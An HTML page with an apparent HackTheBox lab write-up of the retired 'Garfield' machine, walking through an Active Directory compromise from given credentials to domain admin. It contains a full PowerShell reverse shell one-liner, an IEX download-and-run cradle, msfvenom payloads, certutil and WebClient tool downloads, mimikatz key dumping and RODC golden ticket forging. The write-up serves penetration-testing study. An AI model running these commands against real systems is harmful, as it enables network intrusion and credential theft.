@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Garfield | Youssef Ashraf</title>
+<meta name="description" content="This box assumes a breach scenario with credentials j.arbuckle:Th1sD4mnC4t!@1978">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;600;700&family=Zen+Old+Mincho&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+<div class="bg-orb o1" aria-hidden="true"></div>
+<div class="bg-orb o2" aria-hidden="true"></div>
+
+<div class="wrap">
+  <a class="back" href="../../writeups.html">&larr; All write-ups</a>
+  <header class="post-head">
+    <p class="eyebrow">HackTheBox &bull; Retired</p>
+    <h1>Garfield</h1>
+    <p class="meta"><span>Nov 2026</span><span class="pill">HackTheBox</span></p>
+  </header>
+  <article>
+<p>This box assumes a breach scenario with credentials <code>j.arbuckle:Th1sD4mnC4t!@1978</code></p>
+<p>as always we do a nmap scan </p>
+<pre><code class="language-shell">sudo nmap -sVC -oN hostScan -T3 -Pn -vv 10.129.83.70
+</code></pre>
+<pre><code class="language-txt">PORT     STATE SERVICE       REASON          VERSION                                                                                                                       
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus                                                                                                               
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-11-02 04:47:26Z)                                                                
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                         
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                                 
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)                                 
+445/tcp  open  microsoft-ds? syn-ack ttl 127                                                                                                                               
+464/tcp  open  kpasswd5?     syn-ack ttl 127                                                                                                                               
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                                           
+636/tcp  open  tcpwrapped    syn-ack ttl 127                                                                                                                               
+2179/tcp open  vmrdp?        syn-ack ttl 127                                                                                                                               
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)                                 
+3269/tcp open  tcpwrapped    syn-ack ttl 127                                                                                                                               
+3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services                                                                                                   
+|_ssl-date: 2026-11-02T04:48:30+00:00; +8h00m05s from scanner time.                                                                                                        
+| rdp-ntlm-info:                                                                                                                                                           
+|   Target_Name: GARFIELD                                                                                                                                                  
+|   NetBIOS_Domain_Name: GARFIELD                                                                                                                                          
+|   NetBIOS_Computer_Name: DC01                                                                                                                                            
+|   DNS_Domain_Name: garfield.htb                                                                                                                                          
+|   DNS_Computer_Name: DC01.garfield.htb                                                                                                                                   
+|   DNS_Tree_Name: garfield.htb                                                                                                                                            
+|   Product_Version: 10.0.17763                                                                                                                                            
+|_  System_Time: 2026-11-02T04:47:50+00:00                                                                                                                                 
+| ssl-cert: Subject: commonName=DC01.garfield.htb                                                                                                                          
+| Issuer: commonName=DC01.garfield.htb                                                                                                                                     
+| Public Key type: rsa                                                                                                                                                     
+| Public Key bits: 2048                                                                                                                                                    
+| Signature Algorithm: sha256WithRSAEncryption                                                                                                                             
+| Not valid before: 2026-11-01T04:43:50    
+</code></pre>
+<p>so looks like we are dealing with an Active Directory Environment</p>
+<p>Checking the credentials with <code>nxc</code> </p>
+<pre><code class="language-shell">nxc smb 10.129.83.70 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'                                      
+SMB         10.129.83.70    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.83.70    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
+</code></pre>
+<p>lets also check with the other services aswell</p>
+<pre><code class="language-shell">nxc winrm 10.129.83.70 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'         
+WINRM       10.129.83.70    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) 
+WINRM       10.129.83.70    5985   DC01             [-] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
+</code></pre>
+<pre><code class="language-shell">nxc rdp 10.129.83.70 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' 
+RDP         10.129.83.70    3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:garfield.htb) (nla:True)
+RDP         10.129.83.70    3389   DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
+</code></pre>
+<p>so looks like this user has access to <code>smb</code> and <code>rdp</code> , but before that lets go further and try to see if any shares can be read</p>
+<pre><code class="language-shell">nxc smb 10.129.83.70 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
+SMB         10.129.83.70    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.83.70    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
+SMB         10.129.83.70    445    DC01             [*] Enumerated shares
+SMB         10.129.83.70    445    DC01             Share           Permissions     Remark
+SMB         10.129.83.70    445    DC01             -----           -----------     ------
+SMB         10.129.83.70    445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.83.70    445    DC01             C$                              Default share
+SMB         10.129.83.70    445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.83.70    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.83.70    445    DC01             SYSVOL          READ            Logon server share 
+</code></pre>
+<p>looks like these are standard shares but what is interesting is we found a <code>printer.bat</code> on the <code>SYSVOL</code> </p>
+<p>also lets retrieve data using <code>rushound-ce</code> so we can run bloodhound and check the relationships</p>
+<pre><code class="language-shell">rusthound-ce --domain garfield.htb -n 10.129.83.70 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -z
+</code></pre>
+<p>and uploading the zip to the bloodhound web gui
+<img alt="" src="images/garfield/img01.png" />
+no outbound edges, but we do notice the user is part of the <code>IT SUPPORT</code> group, so lets try using bloodyAD to enumerate what exactly can this user write</p>
+<pre><code class="language-shell">bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable --detail
+</code></pre>
+<pre><code class="language-txt">
+distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
+scriptPath: WRITE
+
+distinguishedName: DC=garfield.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=garfield,DC=htb
+dnsNode: CREATE_CHILD
+dnsZoneScopeContainer: CREATE_CHILD
+
+distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb                                                       
+scriptPath: WRITE 
+</code></pre>
+<p>So upon googling and reading more about the <code>scriptPath attribute</code>. </p>
+<p>ScriptPath is the logon script attribute on a user object (LDAP display name Logon Script, ATT&amp;CK T1037.001). When that user logs on interactively, Winlogon/GPSVC reads the value and <code>executes that script as the logging-on user</code>.
+The value is not a free-form path in the normal case — it's a bare filename that the client resolves against the DC's logon-script share:</p>
+<pre><code class="language-txt">\\&lt;DC&gt;\NETLOGON\&lt;scriptPath&gt;
+  ==  C:\Windows\SYSVOL\sysvol\garfield.htb\scripts\&lt;scriptPath&gt;
+  ==  \\dc01.garfield.htb\SYSVOL\garfield.htb\scripts\&lt;scriptPath&gt;
+</code></pre>
+<p>WRITE from BloodyAD is a property-level ACE (WriteProperty on scriptPath only), not GenericWrite/GenericAll. So it doesn't let you reset the password, set an SPN, or write msDS-KeyCredentialLink. It lets you change exactly one thing: which logon script that user runs next time they log in.</p>
+<p>If we circle back on the share enumeration we did notice that we have access to the <code>SYSVOL</code> share
+<img alt="" src="images/garfield/img02.png" />
+so we need to test whether we can write in that scripts directory so that we could write the attribute of the users we found using <code>bloodyAD</code> so they execute the script on startup
+<img alt="" src="images/garfield/img03.png" />
+this confirms that we do have write on that specific directory</p>
+<p>Now lets create a reverse powershell payload file and store it in a <code>.bat</code> which would execute a reverse shell </p>
+<pre><code class="language-shell">msfvenom -p cmd/windows/reverse_powershell LHOST=tun0 LPORT=4444 &gt; printerDetect.bat
+</code></pre>
+<p><img alt="" src="images/garfield/img04.png" />
+so now that we have generated our malicious <code>printerDetect.bat</code> and uploaded it, lets now  write the attribute <code>scriptPath</code> on all the users we could find</p>
+<pre><code class="language-shell">bloodyAD --host 10.129.83.70 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath -v 'printerDetect.bat'
+
+bloodyAD --host 10.129.83.70 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' set object 'CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb' scriptPath -v 'printerDetect.bat'
+</code></pre>
+<p><img alt="" src="images/garfield/img05.png" />
+now lets fire up the listener and wait to get a callback when one of the users start up their machines and executes our malicious script</p>
+<pre><code class="language-shell">rlwrap nc -lvnp 4444
+</code></pre>
+<p>Now upon trying alot i didn't get a callback at all and looks like when checking the <code>lastlogin</code> attribute , its apparent that the user doesn't log in, but from the looks of it its somewhat of a mechanism. The main reason i probably did not get a callback is my payload automatically uses <code>tun0</code> variable in the LHOST, which sometimes would cause an issue . Aswell sometimes when dealing with powershell scripts, you can't execute them unless u specify that u must bypass the <code>ExecutionPolicy</code> , aswell its a good idea to try it with an <code>iwr(invoke web request)</code> to see if u ever get a callback to your server which would mean u did indeed execute the script, so lets try and alter this a bit and see if we do get a callback</p>
+<h4>Recreating the printerDetect.bat Payload</h4>
+<p>first lets create the  web server we will serve the payload on</p>
+<pre><code class="language-shell">python3 -m http.server 6666
+</code></pre>
+<p><code>.bat</code> file which we will use to invoke the web server and extract our payload</p>
+<pre><code class="language-bat">@echo off
+Powershell.exe -NoProfile -ExecutionPolicy bypass -Command &quot;IEX(IWR http://10.10.16.102:6666/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell 10.10.16.102 4444&quot;
+PAUSE
+EXIT
+</code></pre>
+<p>The payload used was <a href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1">Invoke-ConPtyShell.ps1</a> .</p>
+<p>Now after putting back the <code>printerDetect.bat</code> into the smb share , the mechanism of invoking it is by setting the script path</p>
+<p>after some testing it sometimes failed, so i resorted back to the msf payload and adjusted the payload so that it becomes like so</p>
+<pre><code class="language-powershell">powershell -w hidden -ExecutionPolicy bypass -c $a='10.10.16.102';$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}
+</code></pre>
+<p><img alt="" src="images/garfield/img06.png" />
+so we land in as the user <code>l.wilson</code> now lets check first if the machine is domain joined, which we can do by <code>set user</code>
+<img alt="" src="images/garfield/img07.png" />
+since the variables <code>USERDNSDOMAIN and USERDOMAIN</code> are specified with our DC01  , hence this is indeed domain joined</p>
+<p>Circling back to our bloodhound 
+<img alt="" src="images/garfield/img08.png" />
+we find that <code>l.wilson</code> has <code>ForceChangePassword</code> on the <code>l.wilson_adm</code> user, so lets change the password through the windows foothold</p>
+<pre><code class="language-shell">$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
+</code></pre>
+<p><img alt="" src="images/garfield/img09.png" />
+now lets test the credentials through nxc</p>
+<pre><code class="language-shell">nxc smb 10.129.244.207 -u l.wilson_adm -p 'Password123!' 
+</code></pre>
+<p><img alt="" src="images/garfield/img10.png" />
+so now we could switch over to the user <code>l.wilson_adm</code> but first lets check through bloodhound what rights does this user have
+<img alt="" src="images/garfield/img11.png" />
+also these are the groups the user can belong to
+<img alt="" src="images/garfield/img12.png" />
+so since the <code>l.wilson_adm</code> is a member of <code>Remote Management Users</code> and <code>Remote Desktop Users</code>, we could potentially RDP into the user with the password we changed which was <code>l.wilson_adm:Password123!</code> </p>
+<p>Now lets explore the Attack surface since we do have some proper chaining to do. Since <code>l.wilson_adm</code> is a member of <code>TIER 1</code> which can add themselves to <code>RODC Administrators</code> , and it has the <code>WriteAccountRestrictions</code> ACE on the <code>RODC01 Computer</code> . We could potentially do what is called a <code>RODC Golden Ticket</code> attack</p>
+<h2>What is RODC</h2>
+<p><code>RODC(Read Only Domain Controller)</code> is a solution that Microsoft introduced for physical locations that don’t have adequate security to host a Domain Controller but still require directory services for resources in those locations. A branch office is the classic use case.</p>
+<h3>RODC Management</h3>
+<p>As any Active Directory object, an RODC has an attribute named <code>managedBy</code>. Any user or group specified in the attribute has local administrative rights on the RODC. From an attacker point of view, this means that compromising an account listed in the <code>managedBy</code> attribute leads to an RODC admin access. And with sufficient rights to modify this attribute, an attacker can promote himself to RODC admin.</p>
+<h3>Authentication with an RODC</h3>
+<p>To authenticate a principal locally, the RODC must be allowed to retrieve his credentials. Only users, groups and computers that are in the <a href="https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-revealondemandgroup">msDS-RevealOnDemandGroup</a> and not in <a href="https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-neverrevealgroup">msDS-NeverRevealGroup</a> may have their credentials <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753459(v=ws.10)#credential-caching">cached</a> on the RODC to be used for future local authentication (in this case, their principal name IDs are added to its <a href="https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-revealedlist">msDS-Revealed-List</a> attribute). The attributes <code>msDS-RevealOnDemandGroup</code> and <code>msDS-NeverRevealGroup</code> define the <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc730883(v=ws.10)">Password Replication Policy</a> of the RODC.</p>
+<blockquote>
+<p>The default PRP (Password Replication Policy) specifies that no account passwords can be cached on any RODC, and certain accounts are explicitly denied from being cached on any RODC.<br />
+(<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753459(v=ws.10)#credential-caching">Microsoft</a>)</p>
+</blockquote>
+<p>In case the RODC has cached the principal's credentials and thus, is able to authenticate it locally, it will issue a TGT. To do so, the RODC holds a derived version of the <code>krbtgt</code> key named <code>krbtgt_XXXXX</code>(where XXXXX is its random version number) and uses it to sign and encrypt the generated TGT. This <code>krbtgt</code> account's version number can also be found in its <code>msDS-SecondaryKrbTgtNumber</code> attribute.</p>
+<p>The RODC computer account has reset rights on the account <code>krbtgt_XXXXX</code>'s password.</p>
+<p>You could enumerate the <code>version number</code> using <code>bloodyAD</code> </p>
+<pre><code class="language-shell">bloodyAD --host &lt;DC IP&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; get search --filter '(name=krbtgt*)' --attr name,whenCreated,pwdLastSet,msDS-KeyVersionNumber
+</code></pre>
+<p>When the RODC generates the TGT, it indicates in the <code>kvno</code> field the version number of the key used to generate the ticket. With this TGT, it is possible to request a Service Ticket (ST) against the RODC or any accessible standard writable Domain Controller. Note that the PRP attributes (<code>msDS-RevealOnDemandGroup</code> / <code>msDS-NeverRevealGroup</code>) govern which credentials are cached on the RODC. writable DCs issue service tickets following normal authorization rules regardless of PRP membership.</p>
+<p><img alt="" src="https://www.thehacker.recipes/assets/RODC%20Authentication%20mindmap.C36lciZf.png" /></p>
+<p>So in short
+There are 5 key attributes on a RODC:</p>
+<ul>
+<li><code>managedBy</code>: This attribute identifies the group that administers the RODC. Since RODCs are considered to be less trusted than Domain Controllers, they shouldn’t be managed by Active Directory admins (DAs, etc). Often there’s a RODC specific admin group configured in this attribute, sometimes each RODC has a unique admin group.</li>
+<li><code>msDSReveal-OnDemandGroup</code>: Contains the distinguished name (DN) of the Allowed List. Members of the Allowed List are permitted to replicate to the RODC.</li>
+<li><code>msDS-NeverRevealGroup</code>: Points to the distinguished names of security principals that are denied replication to the RODC.</li>
+<li><code>msDS-RevealedList</code>: List of security principals whose passwords have ever been replicated to the RODC.</li>
+<li><code>msDS-AuthenticatedToAccountList</code>: This attribute contains a list of security principals in the local domain that have authenticated to the RODC.</li>
+</ul>
+<p>Now how could this be exploited</p>
+<h3>Exploiting RODCs</h3>
+<p>In the context of RODCs, the term “compromise” could mean several things:</p>
+<ol>
+<li>
+<p>Elevated access to the RODC host</p>
+</li>
+<li>
+<p>Credential access to the RODC computer account</p>
+</li>
+<li>
+<p>Control of the RODC computer object in Active Directory</p>
+</li>
+</ol>
+<p>In the case of elevated access to the RODC host (1) or credential access to the RODC computer account (2), there is a path for domain dominance only if the RODC is permitted to “reveal” the credentials of a Tier Zero security principal.</p>
+<p>In the case of control of the RODC computer object in Active Directory (3), there is a generalized path to domain dominance.</p>
+<p>Generally the main 3 methods that could be used to exploit <code>RODCs</code> are:
+1) <code>RODC Golden Ticket</code>
+2) `Key List Attack
+For more information check this <a href="https://eladshamir.com/2023/01/25/RODCs.html">article</a> and this <a href="https://www.thehacker.recipes/ad/movement/builtins/rodc">article</a></p>
+<p>Now lets go back to our case and then explain the terminologies in which we will use to perform this attack.</p>
+<p>Since our user <code>l.wilson_adm</code> has <code>WriteAccountRestrictions</code> over <code>RODC01.garfield.htb</code> computer, and can add themselves to the <code>RODC Administrators</code> . We could potentially perform a <code>RODC Golden Ticket</code> attack to impersonate the <code>krbtgt_XXXX</code> in the <code>RODC01</code> so that we can request the <code>TGT</code> for the <code>Administrator</code> on the Domain Controller itself <code>DC01</code> and from there request the <code>TGS</code> of the <code>Administrator</code> and use it to impersonate him.</p>
+<p>Lets go over the chain, first lets add ourselves to the <code>RODC Administrators group</code> using <code>bloodyAD</code></p>
+<pre><code class="language-shell">bloodyAD --host 10.129.244.207 -d garfield.htb -u l.wilson_adm -p 'Password123!' add groupMember &quot;RODC Administrators&quot; &quot;l.wilson_adm&quot;
+[+] l.wilson_adm added to RODC Administrators 
+</code></pre>
+<p>and then from there since we now have <code>Administrative Access</code> to the <code>RODC</code> we could enumerate the <code>managedBy</code> and<code>msDSReveal-OnDemandGroup,msDS-NeverRevealGroup,msDS-RevealedList</code> </p>
+<pre><code class="language-shell">bloodyAD --host 10.129.244.207 -d garfield.htb -u l.wilson_adm -p 'Password123!' get object &quot;CN=RODC01,OU=DOMAIN CONTROLLERS,DC=GARFIELD,DC=HTB&quot;
+</code></pre>
+<p><img alt="" src="images/garfield/img13.png" />
+so we find the <code>krbtgt_82425</code> which will be useful for obtaining the golden ticket. So now we want to get Access as the <code>RDC01</code> Administrator so we can get the cached in tickets for the <code>krbtgt_8425</code> so that we can create the golden ticket</p>
+<p>If we circle back to the bloodhound
+<img alt="" src="images/garfield/img14.png" />
+we notice that <code>l.wilson_adm</code> has <code>WriteAccountRestrictions</code> on the computer <code>RDC01.garfield.htb</code> , upon searching more this essentially allows us to  write the Account Restrictions property set, which includes <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> which is the primitive condition to perform <code>Resource Based Constrained Delegation(RBCD)</code></p>
+<p>So in order to perform the <code>RBCD</code> Attack, we first need to create a computer we control to . Any domain user can create up to 10 machine accounts (ms-DS-MachineAccountQuota), and you need a principal you own to drive RBCD. We could do this using <code>impacket-addcomputer.py</code></p>
+<h4>creating machine account</h4>
+<pre><code class="language-shell">impacket-addcomputer garfield.htb/j.arbuckle:'Th1sD4mnC4t!@1978' -dc-ip 10.129.244.207 -computer-name ATTACKER$ -computer-pass 'Password234!'
+</code></pre>
+<p><img alt="" src="images/garfield/img15.png" /></p>
+<p>and then now we want to write the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the <code>RDC01$</code> so that we can tell the <code>KDC(Key Distribution Center)</code> that the computer name <code>ATTACKER$</code>may impersonate any user to services on <code>RODC01</code>." It works because <code>l.wilson_adm</code> has WRITE on that object. We could perform this using <code>impacket-rbcd.py</code></p>
+<h4>performing RBCD Delegation</h4>
+<pre><code class="language-shell">impacket-rbcd garfield.htb/l.wilson_adm:'Password123!' -delegate-to 'RODC01$' -delegate-from 'ATTACKER$' -action write -dc-ip 10.129.244.207
+</code></pre>
+<p><img alt="" src="images/garfield/img16.png" /></p>
+<p>and then now that we have configured that the <code>ATTACKER$</code> can impersonate the <code>RODC01$</code> and can request a <code>TGS</code> to impersonate the <code>Administrator</code></p>
+<pre><code class="language-shell">impacket-getST garfield.htb/ATTACKER\$:'Password234!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.244.207
+</code></pre>
+<p><img alt="" src="images/garfield/img17.png" />
+getST does S4U2Self (ticket for ATTACKER$ as Administrator) + S4U2Proxy (ticket to cifs/RODC01 as Administrator). The KDC is DC01 and it can encrypt the ticket for RODC01$ because it has that machine account's key.
+<img alt="" src="images/garfield/img18.png" />
+now that we have the ccache file, we could now use the ticket with <code>psexec</code> to log into the <code>RODC01</code> as <code>SYSTEM</code> since we are impersonating <code>Administrator</code> with his <code>TGS</code> , but since we don't know where this host lies in the internal network, we must first check where it is and how to pivot to it</p>
+<h4>Pivoting to RODC01</h4>
+<p>First we must establish the pivot, but we could check if an internal network is found by utilizing the reverse shell we got as <code>l.wilson</code> and do <code>ipconfig /all</code> 
+<img alt="" src="images/garfield/img19.png" />
+now lets use <code>ligolo</code> to pivot and reach the internal network, In my case i logged in using <code>l.wilson_adm</code> through <code>evil-winrm</code> and then transferred the <code>agent.exe</code> to the host</p>
+<pre><code class="language-shell">evil-winrm -i garfield.htb -u 'l.wilson_adm' -p 'Password123!'
+</code></pre>
+<p><img alt="" src="images/garfield/img20.png" />
+and on the attack host with the <code>proxy</code>
+<img alt="" src="images/garfield/img21.png" />
+ok now lets perform a ping sweep using <code>nxc</code> to see where the <code>RODC01</code> host is residing</p>
+<pre><code class="language-shell">nxc smb 192.168.100.0/24                        
+</code></pre>
+<p><img alt="" src="images/garfield/img22.png" />
+so the host is at <code>192.168.100.2</code> now using the <code>ccache</code> ticket we can now just <code>psexec</code> into the host like so first lets change our <code>KRB55CNAME</code> to the <code>ccache</code> file in order to use <code>Kerberos</code></p>
+<pre><code class="language-shell"> export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache 
+</code></pre>
+<p>we can test whether we are using the proper ticket using <code>klist</code> 
+<img alt="" src="images/garfield/img23.png" />
+so with that </p>
+<pre><code class="language-shell">impacket-psexec -k -no-pass -dc-ip 192.168.100.1 -target-ip 192.168.100.2 RODC01.garfield.htb
+</code></pre>
+<p><img alt="" src="images/garfield/img24.png" />
+Now since we want to dump the <code>krb5tgt_8425</code> it would be better to gain an interactive shell since psexec doesn't work well with <code>mimikatz</code> and <code>Rubeus</code> , so we could do so using <code>msfvenom</code></p>
+<pre><code class="language-shell">msfvenom -p windows/shell/reverse_tcp LHOST=192.168.100.1 LPORT=7777 -f exe &gt; reverse_rodc01.exe
+</code></pre>
+<p>we used the LHOST as the DC01 host since the host <code>RODC01</code> is in an internal network, now from the <code>ligolo proxy</code> lets add a listener to forward the port to our attack host</p>
+<pre><code class="language-shell">listener_add --addr 192.168.100.1:7777 --to 0.0.0.0:7777
+</code></pre>
+<p><img alt="" src="images/garfield/img25.png" />
+now lets first transfer the .exe and then catch the listener
+<img alt="" src="images/garfield/img26.png" />
+on the <code>RDCO1</code> host</p>
+<pre><code class="language-cmd">certutil.exe -urlcache -split -f &quot;http://192.168.100.1:7777/reverse_rodc01.exe&quot; reverse_rodc01.exe
+</code></pre>
+<p>After gaining persistence, we now need to transfer <code>mimikatz</code> and <code>Rubeus</code> , and also add Administrator  to <code>msDS-RevealOnDemandGroup</code> and <code>msDS-NeverRevealGroup</code> so that we  remove the block that prevented Administrator's credentials from being replicated to the RODC:</p>
+<pre><code class="language-powershell">powershell -c &quot;(New-Object System.Net.WebClient).DownloadFile('http://192.168.100.1:7777/mimikatz.exe','C:\Windows\Temp\mimikatz.exe')&quot;
+powershell -c &quot;(New-Object System.Net.WebClient).DownloadFile('http://192.168.100.1:7777/Rubeus.exe','C:\Windows\Temp\Rubeus.exe')&quot;
+</code></pre>
+<p>and then dump the <code>krb5tgt_8425</code> ticket using <code>mimikatz</code></p>
+<pre><code class="language-cmd">C:\Windows\Temp\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /inject /name:krbtgt_8245&quot; &quot;exit&quot;
+</code></pre>
+<p>The AES256 key for <code>krbtgt_8245</code> is extracted: <code>d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240</code></p>
+<h3>Forging the RODC golden ticket</h3>
+<p>Using <code>Rubeus</code> we can now form the <code>Golden Ticket</code> </p>
+<pre><code class="language-cmd">Rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /nowrap
+</code></pre>
+<pre><code class="language-txt">[*] Forged a TGT for 'Administrator@garfield.htb'
+[*] base64(ticket.kirbi): doIFkjCCBY6gAwIBBaED...
+</code></pre>
+<p>Then exchange the <code>TGT</code> to a <code>TGS</code> by using <code>Rubeus asktgs /keylist</code> so that we can use it to authenicate as the <code>DC01 Administrator</code></p>
+<pre><code>Rubeus.exe asktgs /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:&lt;base64_ticket&gt; /nowrap
+</code></pre>
+<pre><code>```txt
+[+] TGS request successful!
+Password Hash : EE238F6DEBC752010428F20875B092D5
+</code></pre>
+<p>so now with that we have obtained the <code>NTLM hash</code> for <code>Administrator</code> , and now we could just <code>evil-winrm</code>
+<img alt="" src="images/garfield/img27.png" />
+ and thats it</p>
+<p>Happy Hacking</p>
+  </article>
+  <div class="article-footer">Written by Youssef Ashraf. Published for a retired HTB machine, in line with HTB's write-up policy.</div>
+</div>
+
+<script src="../../js/main.js"></script>
+</body>
+</html>
